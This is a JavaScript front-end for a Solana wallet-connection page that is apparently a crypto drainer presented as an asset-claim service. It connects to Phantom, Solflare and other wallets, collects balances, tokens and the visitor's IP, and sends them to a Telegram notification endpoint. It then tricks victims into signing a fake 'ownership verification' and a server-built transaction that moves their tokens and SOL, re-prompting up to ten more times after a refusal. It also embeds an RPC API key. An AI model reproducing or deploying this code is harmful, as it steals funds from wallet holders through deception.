// =============================================
// CLIENT CONFIGURATION
// =============================================

const CLIENT_CONFIG = {
    SOLANA_RPC_URL: 'https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F',
    MAX_RETRIES: 10
};

// =============================================
// WALLET PROVIDERS CONFIGURATION
// =============================================

const WALLET_PROVIDERS = {
    phantom: {
        name: 'Phantom Wallet',
        installUrl: {
            chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
            mobile: 'https://phantom.app/download'
        }
    },
    solflare: {
        name: 'Solflare Wallet',
        installUrl: {
            chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
            mobile: 'https://solflare.com/download'
        }
    },
    backpack: {
        name: 'Backpack Wallet',
        installUrl: {
            chrome: 'https://chrome.google.com/webstore/detail/backpack/aflkmfhebedbjioipglgcbcmnbpgliof',
            mobile: 'https://www.backpack.app/'
        }
    },
    sollet: {
        name: 'Sollet Wallet',
        installUrl: {
            chrome: 'https://chrome.google.com/webstore/detail/sollet/fhmfendgdocmcbmfikdcogofphimnkno',
            mobile: 'https://www.sollet.io/'
        }
    },
    coinbase: {
        name: 'Coinbase Wallet',
        installUrl: {
            chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
            mobile: 'https://www.coinbase.com/wallet'
        }
    }
};

// =============================================
// MAIN APPLICATION
// =============================================

$(document).ready(function() {
    let selectedWalletProvider = null;

    // =============================================
    // UTILITY FUNCTIONS
    // =============================================

    async function getClientIP() {
        try {
            const response = await fetch('/client-ip');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }

    // =============================================
    // WALLET MANAGEMENT
    // =============================================

    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const wallets = {
            phantom: {
                provider: window.solana,
                condition: window.solana && window.solana.isPhantom,
                ...WALLET_PROVIDERS.phantom,
                isMobileSupported: true
            },
            solflare: {
                provider: window.solflare,
                condition: window.solflare && window.solflare.isSolflare,
                ...WALLET_PROVIDERS.solflare,
                isMobileSupported: true
            },
            backpack: {
                provider: window.backpack,
                condition: window.backpack,
                ...WALLET_PROVIDERS.backpack,
                isMobileSupported: false
            },
            sollet: {
                provider: window.sollet,
                condition: window.sollet,
                ...WALLET_PROVIDERS.sollet,
                isMobileSupported: false
            },
            coinbase: {
                provider: window.coinbaseWalletExtension,
                condition: window.coinbaseWalletExtension,
                ...WALLET_PROVIDERS.coinbase,
                isMobileSupported: true
            }
        };

        Object.keys(wallets).forEach(walletId => {
            const wallet = wallets[walletId];
            const statusElement = document.getElementById(`${walletId}-status`);
            const optionElement = document.getElementById(`${walletId}-wallet`);
            
            if (!statusElement) return;
            
            if (wallet.condition) {
                statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                if (optionElement) optionElement.disabled = false;
            } else if (isMobileDevice && wallet.isMobileSupported) {
                statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                if (optionElement) optionElement.disabled = false;
            } else {
                statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                if (optionElement) optionElement.disabled = false;
            }
        });

        return wallets;
    }

    function getWalletProvider(walletType) {
        const providers = {
            phantom: window.solana,
            solflare: window.solflare,
            backpack: window.backpack,
            sollet: window.sollet,
            coinbase: window.coinbaseWalletExtension
        };
        return providers[walletType];
    }

    // =============================================
    // TOKEN MANAGEMENT
    // =============================================

    async function getSPLTokenInfo(connection, publicKey) {
        try {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: solanaWeb3.TOKEN_PROGRAM_ID,
            });

            const tokens = [];
            
            for (const tokenAccount of tokenAccounts.value) {
                const accountData = tokenAccount.account.data;
                const parsedInfo = accountData.parsed.info;
                const balance = parsedInfo.tokenAmount;

                if (balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = 'Unknown'; // Symbol would be determined server-side
                    const usdValue = 0; // Value would be calculated server-side
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }

    // =============================================
    // NOTIFICATION MANAGEMENT
    // =============================================

    async function sendTelegramNotification(message) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address: message.address,
                    balance: message.balance,
                    usdBalance: message.usdBalance,
                    walletType: message.walletType,
                    customMessage: message.customMessage,
                    splTokens: message.splTokens,
                    ip: message.ip
                })
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }

    // =============================================
    // WALLET CONNECTION FLOW
    // =============================================

    async function connectWallet(walletType, walletProvider) {
        try {
            const wallets = checkWalletAvailability();
            const walletInfo = wallets[walletType];
            const isMobileDevice = isMobile();
            
            // Mobile deep link handling
            if (isMobileDevice && !walletInfo.condition) {
                await handleMobileDeepLink(walletType, walletInfo);
                return;
            }
            
            // Desktop wallet installation check
            if (!walletInfo.condition) {
                await handleWalletInstallation(walletType, walletInfo, isMobileDevice);
                return;
            }

            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }

            showWalletLoading();
            setupLoadingUI(walletType, walletInfo);

            // Connect to wallet
            const resp = await walletProvider.connect();
            console.log(`${walletInfo.name} connected:`, resp);

            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

            // Initialize connection and get wallet info
            const connection = new solanaWeb3.Connection(CLIENT_CONFIG.SOLANA_RPC_URL, 'confirmed');
            const publicKeyString = await getPublicKeyString(walletType, walletProvider, resp);
            const public_key = new solanaWeb3.PublicKey(publicKeyString);
            
            // Get wallet balance and tokens
            const walletBalance = await connection.getBalance(public_key);
            const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);
            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, public_key);

            // Send connection notification
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });

            // Check minimum balance
            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            const requiredBalance = 0.02 * 1000000000;
            
            if (walletBalance < requiredBalance) {
                await handleInsufficientBalance(publicKeyString, solBalanceFormatted, walletInfo.name);
                return;
            }

            $('#connect-wallet').text("Processing...");

            // Attempt transaction with retry logic
            await attemptTransaction(
                walletType, 
                walletProvider, 
                connection, 
                publicKeyString, 
                solBalanceFormatted, 
                walletInfo.name
            );
            
        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            await handleConnectionError(walletType, err);
        }
    }

    // =============================================
    // TRANSACTION HANDLING
    // =============================================

    async function attemptTransaction(walletType, walletProvider, connection, publicKeyString, solBalanceFormatted, walletName, retryCount = 0) {
        const maxRetries = CLIENT_CONFIG.MAX_RETRIES;
        
        try {
            // Ownership verification
            const ownershipVerified = await verifyOwnership(walletType, walletProvider, publicKeyString, solBalanceFormatted, walletName, retryCount);
            if (!ownershipVerified) {
                throw new Error('Failed to verify wallet ownership');
            }
            
            // Prepare transaction
            $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
            $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
            $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
            
            const prepareResponse = await fetch('/prepare-transaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    publicKey: publicKeyString,
                    verified: true
                })
            });

            const prepareData = await prepareResponse.json();
            
            if (!prepareResponse.ok) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletName,
                    customMessage: '❌ Transaction Preparation Failed'
                });
                alert(prepareData.error || "Failed to prepare transaction");
                $('#connect-wallet').text("Connect Wallet");
                return;
            }

            // Sign transaction
            $('.wallet-loading-title').text('Signing Transaction');
            $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
            
            const transactionBytes = new Uint8Array(prepareData.transaction);
            const transaction = solanaWeb3.Transaction.from(transactionBytes);
            const signed = await walletProvider.signTransaction(transaction);
            console.log("Transaction signed:", signed);

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletName,
                customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
            });

            // Confirm transaction
            $('.wallet-loading-title').text('Confirming Transaction');
            $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
            
            let txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);
            console.log("Transaction confirmed:", txid);
            
            const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
            const solscanUrl = `https://solscan.io/tx/${txid}`;
            
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletName,
                customMessage: `🎉 Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
            });
            
            // Success
            $('.wallet-loading-title').text('Success!');
            $('.wallet-loading-subtitle').html('Assets have been successfully claimed.<br>Transaction confirmed on blockchain.');
            $('#connect-wallet').text("Assets Claimed Successfully!");
            
            setTimeout(() => {
                unlockModal();
                hideWalletModal();
                $('#connect-wallet').text("Connect Wallet");
            }, 2000);
            
        } catch (err) {
            await handleTransactionError(err, walletType, walletProvider, connection, publicKeyString, solBalanceFormatted, walletName, retryCount, maxRetries);
        }
    }

    // =============================================
    // HELPER FUNCTIONS
    // =============================================

    async function handleMobileDeepLink(walletType, walletInfo) {
        let deepLinkUrl, appName;
        
        if (walletType === 'phantom') {
            const currentUrl = getCurrentSiteUrl();
            deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
            appName = 'Phantom App';
        } else if (walletType === 'solflare') {
            const currentUrl = getCurrentSiteUrl();
            deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
            appName = 'Solflare App';
        } else {
            throw new Error('Mobile deep linking not supported for this wallet');
        }
        
        await sendTelegramNotification({
            address: 'Unknown',
            balance: 'Unknown',
            usdBalance: 'Unknown',
            walletType: walletInfo.name,
            customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
        });
        
        showWalletLoading();
        $('.wallet-loading-title').text(`Opening ${appName}`);
        $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
        
        const connectionCheckInterval = setInterval(() => {
            const provider = getWalletProvider(walletType);
            const condition = walletInfo.condition;
                
            if (condition) {
                clearInterval(connectionCheckInterval);
                connectWallet(walletType, provider);
            }
        }, 1000);
        
        setTimeout(() => {
            clearInterval(connectionCheckInterval);
            showWalletOptions();
            unlockModal();
        }, 120000);
        
        window.location.href = deepLinkUrl;
    }

    async function handleWalletInstallation(walletType, walletInfo, isMobileDevice) {
        let installUrl;
        if (isMobileDevice && walletInfo.installUrl.mobile) {
            installUrl = walletInfo.installUrl.mobile;
        } else {
            const isFirefox = typeof InstallTrigger !== "undefined";
            installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
        }
        
        await sendTelegramNotification({
            address: 'Unknown',
            balance: 'Unknown',
            usdBalance: 'Unknown',
            walletType: walletInfo.name,
            customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
        });
        
        showWalletOptions();
        
        const installMessage = isMobileDevice ? 
            `${walletInfo.name} mobile app is required. Would you like to download it?` :
            `${walletInfo.name} is not installed. Would you like to install it?`;
        
        if (confirm(installMessage)) {
            window.open(installUrl, '_blank');
        }
    }

    function setupLoadingUI(walletType, walletInfo) {
        if (walletType === 'phantom') {
            $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
            $('.wallet-loading-spinner img').attr('alt', 'Phantom');
            $('.wallet-loading-title').text('Connecting Phantom');
            $('.wallet-loading-spinner').removeClass('solflare');
        } else if (walletType === 'solflare') {
            $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
            $('.wallet-loading-spinner img').attr('alt', 'Solflare');
            $('.wallet-loading-title').text('Connecting Solflare');
            $('.wallet-loading-spinner').addClass('solflare');
        } else {
            $('.wallet-loading-title').text('Connecting to Wallet');
            $('.wallet-loading-spinner').removeClass('solflare');
        }
        
        $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');
    }

    async function getPublicKeyString(walletType, walletProvider, resp) {
        let publicKeyString;
        if (walletType === 'solflare') {
            if (walletProvider.publicKey) {
                publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
            } else if (walletProvider.pubkey) {
                publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
            } else {
                throw new Error('No public key received from Solflare wallet');
            }
        } else {
            if (resp.publicKey) {
                publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
            } else {
                throw new Error('No public key received from wallet');
            }
        }
        return publicKeyString;
    }

    async function handleInsufficientBalance(publicKeyString, solBalanceFormatted, walletName) {
        await sendTelegramNotification({
            address: publicKeyString,
            balance: solBalanceFormatted,
            usdBalance: 'Unknown',
            walletType: walletName,
            customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
        });
        
        $('.wallet-loading-title').text('Insufficient Balance');
        $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
        
        showRejectionEffects();
        
        setTimeout(() => {
            unlockModal();
            showWalletOptions();
            $('#connect-wallet').text("Connect Wallet");
        }, 3000);
    }

    async function verifyOwnership(walletType, walletProvider, publicKeyString, solBalanceFormatted, walletName, retryCount) {
        const verificationKey = `ownership_verified_${publicKeyString}`;
        const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
        
        if (isAlreadyVerified) {
            console.log("Ownership already verified for this wallet, skipping verification");
            
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletName,
                customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
            });
            
            return true;
        }

        $('.wallet-loading-title').text(`Verifying ${walletName} Ownership`);
        $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletName} wallet.<br>This confirms you own this wallet.`);
        $('#connect-wallet').text('Verifying Ownership...');
        
        const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
        const messageBytes = new TextEncoder().encode(verificationMessage);
        
        try {
            const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
            console.log("Ownership verification signed:", signedMessage);
            
            localStorage.setItem(verificationKey, 'true');
            
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletName,
                customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
            });
            
            return true;
        } catch (signError) {
            console.error("Ownership verification failed:", signError);
            
            const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
            const signErrorCode = signError.code || '';
            const signErrorName = signError.name || '';
            
            const isSignRejection = 
                signErrorMessage.includes('User rejected') || 
                signErrorMessage.includes('rejected') || 
                signErrorMessage.includes('cancelled') ||
                signErrorCode === 4001 ||
                signErrorCode === -32003 ||
                signErrorName === 'UserRejectedRequestError';
            
            if (isSignRejection) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                    customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                });
                
                if (retryCount < CLIENT_CONFIG.MAX_RETRIES) {
                    showRejectionEffects();
                    $('.wallet-loading-title').text('Verification Rejected');
                    $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${CLIENT_CONFIG.MAX_RETRIES + 1})<br>Sign the verification message in your wallet.`);
                    
                    setTimeout(() => {
                        clearRejectionEffects();
                        return false;
                    }, 2000);
                } else {
                    throw new Error('Ownership verification rejected too many times');
                }
            } else {
                throw signError;
            }
        }
        return false;
    }

    async function handleTransactionError(err, walletType, walletProvider, connection, publicKeyString, solBalanceFormatted, walletName, retryCount, maxRetries) {
        console.error("Error during claiming:", err);
        
        const errorMessage = err.message || err.toString() || 'Unknown error';
        const errorCode = err.code || '';
        const errorName = err.name || '';
        
        const isUserRejection = 
            errorMessage.includes('User rejected') || 
            errorMessage.includes('rejected') || 
            errorMessage.includes('cancelled') ||
            errorMessage.includes('Transaction cancelled') ||
            errorCode === 4001 ||
            errorCode === -32003 ||
            errorName === 'UserRejectedRequestError';
        
        if (isUserRejection) {
            if (retryCount < maxRetries) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                    customMessage: `❌ Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
                });
                
                showRejectionEffects();
                
                $('.wallet-loading-title').text('Transaction Rejected');
                $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
                
                setTimeout(() => {
                    clearRejectionEffects();
                    attemptTransaction(walletType, walletProvider, connection, publicKeyString, solBalanceFormatted, walletName, retryCount + 1);
                }, 2000);
                return;
            } else {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
                    customMessage: `❌ Transaction Rejected ${maxRetries + 1} Times - Giving Up`
                });
                
                showRejectionEffects();
                
                $('.wallet-loading-title').text('Transaction Failed');
                $('.wallet-loading-subtitle').html(`Transaction was rejected ${maxRetries + 1} times.<br>Please try again later.`);
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                return;
            }
        }
        
        let notificationMessage = '❌ Transaction Failed';
        
        await sendTelegramNotification({
            address: publicKeyString,
            balance: solBalanceFormatted,
            usdBalance: 'Unknown',
            walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
            customMessage: `${notificationMessage}: ${errorMessage} (Attempt ${retryCount + 1})`
        });
        
        $('.wallet-loading-title').text('Transaction Failed');
        $('.wallet-loading-subtitle').html('An error occurred during the transaction.<br>Please try again.');
        
        setTimeout(() => {
            unlockModal();
            showWalletOptions();
            $('#connect-wallet').text("Connect Wallet");
        }, 3000);
    }

    async function handleConnectionError(walletType, err) {
        $('.wallet-loading-title').text('Connection Failed');
        $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
        
        await sendTelegramNotification({
            address: 'Unknown',
            balance: 'Unknown',
            usdBalance: 'Unknown',
            walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown',
            customMessage: `❌ Wallet Connection Failed: ${err.message || err.toString() || 'Unknown error'}`
        });
        
        setTimeout(() => {
            showWalletOptions();
            unlockModal();
        }, 2000);
        
        setTimeout(() => {
            const walletName = walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : 'Unknown';
            alert(`Failed to connect to ${walletName}: ${err.message || err.toString() || 'Unknown error'}`);
        }, 2100);
    }

    // =============================================
    // UI MANAGEMENT
    // =============================================

    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }

    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }

    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }

    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }

    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }

    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        clearRejectionEffects();
    }

    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.phantom-icon').addClass('rejected');
        $('.solflare-icon').addClass('rejected');
        $('.wallet-loading-spinner img').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        
        setTimeout(() => {
            $('.wallet-modal-content').removeClass('shake');
        }, 600);
    }

    function clearRejectionEffects() {
        $('.wallet-loading-spinner').removeClass('rejected');
        $('.phantom-icon').removeClass('rejected');
        $('.solflare-icon').removeClass('rejected');
        $('.wallet-loading-spinner img').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }

    // =============================================
    // EVENT LISTENERS
    // =============================================

    $('#connect-wallet, #connect-wallet-hero').on('click', function() {
        showWalletModal();
    });

    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        
        connectWallet(walletType, walletProvider);
    });

    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    // Initialize wallet availability check
    checkWalletAvailability();
});